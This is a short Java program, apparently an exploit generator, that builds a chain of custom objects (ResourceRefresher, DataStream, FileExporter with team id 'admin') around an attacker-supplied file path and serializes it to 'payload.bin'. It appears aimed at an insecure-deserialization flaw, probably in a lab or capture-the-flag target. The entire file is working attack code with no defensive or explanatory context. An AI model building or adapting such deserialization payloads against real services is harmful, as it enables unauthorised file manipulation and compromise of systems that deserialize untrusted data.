
import com.agent.update.deserialization.*;
import java.io.*;

public class PayloadGen {
    public static void main(String[] args) throws Exception {
        String path = args[0];

        FileExporter fe = new FileExporter();
        fe.setTeamId("admin");

        DataStream ds = new DataStream();
        ds.setExporter(fe);

        ResourceRefresher rr = new ResourceRefresher();
        rr.setTargetPath(path);
        rr.setDataStream(ds);

        FileOutputStream fos = new FileOutputStream("payload.bin");
        ObjectOutputStream oos = new ObjectOutputStream(fos);
        oos.writeObject(rr);
        oos.close();
        fos.close();

        System.out.println("GENERATED: " + path);
    }
}
